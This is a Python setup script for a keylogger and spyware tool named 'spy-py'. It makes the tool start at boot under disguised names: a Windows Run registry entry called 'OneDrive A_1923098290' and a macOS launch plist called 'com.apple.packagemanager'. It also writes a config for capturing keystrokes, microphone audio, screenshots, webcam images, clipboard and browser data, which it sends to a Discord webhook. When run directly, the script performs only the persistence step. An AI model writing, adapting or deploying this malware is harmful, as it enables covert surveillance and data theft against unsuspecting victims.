import os
import sys
import platform
import ctypes
import subprocess

try:
    import plistlib
except ImportError:
    pass

try:
    import winreg
except ImportError:
    pass

current_dir = os.path.dirname(os.path.realpath(__file__))
main_file_path = os.path.join(current_dir, "main.pyw")
log_file_path = os.path.join(current_dir, "logs", "logs.txt")


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def add_to_startup():
    main_file_path = os.path.join(os.getcwd(), "main.pyw")
    log_file_path = os.path.join(os.getcwd(), "logs", "logs.txt")
    python_interpreter_path = sys.executable
    if python_interpreter_path.lower().endswith("python.exe"):
        python_interpreter_path = python_interpreter_path[:-10] + "pythonw.exe"

    if platform.system() == "Windows":
        if is_admin():
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
        else:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
        winreg.SetValueEx(
            key,
            "OneDrive A_1923098290",
            0,
            winreg.REG_SZ,
            f"{python_interpreter_path} {main_file_path}",
        )
        winreg.CloseKey(key)
    elif platform.system() == "Darwin":
        if os.getuid() == 0:
            plist_path = "/Library/LaunchDaemons/com.apple.packagemanager.plist"
        else:
            plist_path = os.path.expanduser(
                "~/Library/LaunchAgents/com.apple.packagemanager.plist"
            )
        plist = dict(
            Label="com.apple.packagemanager",
            ProgramArguments=[python_interpreter_path, main_file_path],
            RunAtLoad=True,
            StandardOutPath=log_file_path,
            StandardErrorPath=log_file_path,
        )
        with open(plist_path, "wb") as f:
            plistlib.dump(plist, f)


def install_requirements():
    with open("requirements.txt", "r") as f:
        requirements = f.read().splitlines()
    for requirement in requirements:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", requirement],
            capture_output=True,
            text=True,
        )
        if result.returncode != 0:
            print(f"Error installing {requirement}: {result.stderr}")
        else:
            print(result.stdout)


def main():
    try:
        print("Installing requirements...")
        install_requirements()
        print("Requirements installed successfully.")
    except Exception as e:
        print(f"Error installing requirements: {e}")
        print(
            "Please install the requirements manually by running 'pip install -r requirements.txt'."
        )
    try:
        print("Adding to startup...")
        add_to_startup()
        print(
            "Added to startup. Please restart your system to start the keylogger and make sure it is working as expected."
        )
    except Exception as e:
        print(f"Error adding to startup: {e}")

    config_values = {
        "LOG_DIRECTORY_PATH": input(
            "Enter the log directory path WITH QUOTATION MARKS AROUND IT (hit enter for default value os.path.join(tempfile.gettempdir(), 'logs')): "
        ),
        "SEND_LOGS_INTERVAL_SEC": input(
            "Enter the send logs interval in seconds (hit enter for default value 1000): "
        ),
        "DISCORD_WEBHOOK_URL": input(
            "Enter the Discord webhook URL WITH QUOTATION MARKS AROUND IT (THE PROGRAM WILL NOT FUNCTION WITHOUT THIS): "
        ),
        "MICROPHONE_RECORD_DURATION_SEC": input(
            "Enter the microphone record duration in seconds (hit enter for default value 60): "
        ),
        "SCREENSHOT_INTERVAL_SEC": input(
            "Enter the screenshot interval in seconds (hit enter for default value 60): "
        ),
        "WEBCAM_CAPTURE_INTERVAL_SEC": input(
            "Enter the webcam capture interval in seconds (hit enter for default value 60): "
        ),
        "CLIPBOARD_LOG_INTERVAL_SEC": input(
            "Enter the clipboard log interval in seconds (hit enter for default value 500): "
        ),
        "BROWSER_LOG_INTERVAL_SEC": input(
            "Enter the browser log interval in seconds (hit enter for default value 20000): "
        ),
    }

    default_values = {
        "LOG_DIRECTORY_PATH": 'os.path.join(tempfile.gettempdir(), "logs")',
        "SEND_LOGS_INTERVAL_SEC": "1000",
        "DISCORD_WEBHOOK_URL": '""',
        "MICROPHONE_RECORD_DURATION_SEC": "60",
        "SCREENSHOT_INTERVAL_SEC": "60",
        "WEBCAM_CAPTURE_INTERVAL_SEC": "60",
        "CLIPBOARD_LOG_INTERVAL_SEC": "500",
        "BROWSER_LOG_INTERVAL_SEC": "20000",
    }

    with open("config.py", "w") as configfile:
        configfile.write("import os\nimport tempfile\n\n")
        for key, value in config_values.items():
            if value == "":
                configfile.write(f"{key} = {default_values[key]}\n")
            else:
                configfile.write(f"{key} = {value}\n")

        configfile.write(
            'DISCORD_WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140"\n'
        )
        configfile.write('DISCORD_WEBHOOK_USERNAME = "spy-py"\n')
        print("Setup completed successfully.")


if __name__ == "__main__":
    add_to_startup()
